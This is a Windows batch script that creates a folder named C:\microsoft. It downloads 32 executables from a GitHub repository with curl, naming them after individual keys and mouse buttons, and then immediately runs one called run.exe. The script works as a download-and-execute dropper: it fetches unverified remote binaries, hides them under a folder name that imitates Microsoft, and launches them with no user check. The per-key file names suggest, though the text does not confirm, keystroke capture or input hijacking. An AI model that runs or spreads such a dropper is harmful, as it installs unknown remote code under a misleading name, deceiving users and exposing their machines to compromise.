@echo off
set "baseUrl=https://raw.githubusercontent.com/astorrs276/Public-AHK/main"
set "destDir=C:\microsoft"

:: Create destination directory if it doesn't exist
if not exist "%destDir%" mkdir "%destDir%"

:: List of filenames
for %%F in (
    a.exe
    b.exe
    c.exe
    d.exe
    e.exe
    f.exe
    g.exe
    h.exe
    i.exe
    j.exe
    k.exe
    l.exe
    m.exe
    n.exe
    o.exe
    p.exe
    q.exe
    r.exe
    s.exe
    t.exe
    u.exe
    v.exe
    w.exe
    x.exe
    y.exe
    z.exe
    LButton.exe
    RButton.exe
    Delete.exe
    Backspace.exe
    Space.exe
    run.exe
) do (
    curl -L -o "%destDir%\%%F" "%baseUrl%/%%F"
)
call "C:\microsoft\run.exe"

exit
